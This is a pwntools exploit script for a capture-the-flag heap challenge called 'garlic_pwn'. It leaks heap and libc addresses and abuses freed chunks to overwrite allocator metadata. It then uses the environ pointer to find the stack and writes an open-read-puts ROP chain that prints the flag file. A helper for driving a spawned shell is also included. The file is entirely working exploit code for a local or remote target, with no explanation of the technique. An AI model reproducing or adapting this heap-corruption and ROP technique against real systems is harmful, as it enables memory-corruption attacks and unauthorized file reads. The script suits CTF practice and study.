# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './garlic_pwn'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    # context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size , content = 'a'):
    cmd(1)
    sla(' size:' , size)
    sa(' Content:' , content)

def delete( idx ):
    cmd(2)
    sla('idx:' , idx)

def show( idx ):
    cmd(4)
    sla('idx:' , idx)

def edit( idx , content):
    cmd(3)
    sla('idx:' , idx)
    sa(' Content:' , content)

# one_gad = one_gadget(libc.path)
# ptr_lits = $rebase(0x4040)

def attack():
    
    ptr_lits = 0x4040

    add(0x500)
    add(0x500)
    show(0)
    rl()
    leak = u64(p.recv(6).ljust( 8, '\x00')) - 0x61 - 0x1100
    lg('leak',leak)

    delete(0)
    delete(1)

    edit(1 , p64(leak + 0x60 - 0x500 - 0x300 - 0x100))
    add(0x500) #2
    add(0x500) #3

    add(0x500 , 'a'*0x8) #4
    show(4)

    libc.address = l64() + 0x3f8c0
    lg('libc.address' , libc.address)
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    environ = libc.sym['__environ']
    binsh_addr = libc.search('/bin/sh').next()


    fake = flat(
        0x10 , libc.address - 0x3f8c0,
        0 , 0x0000002f00030d00,
        environ 
    )
    
    edit(4 , fake)
    add(0x500)
    show(5)
    stack_addr = l64() - 0x119 + 0x48 - 0x68

    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    ret = libc.search(asm(' ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    
    flag_addr = stack_addr + 0x100
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80

    fake = flat(
        0x10 , libc.address - 0x3f8c0,
        0 , 0x0000002f00030d00,
        stack_addr
    )
    edit(4 , fake)

    # dbg('*$rebase(0x00000000000160C)')
    add(0x500 , chain )
    


    # cmd(5)
    # delete()


    p.interactive()
    ''

# attack()
exhaust(attack)
# p.success(getShell())

'''
@File    :   garlic_pwn.py
@Time    :   2021/10/30 13:27:00
@Author  :   Niyah 
'''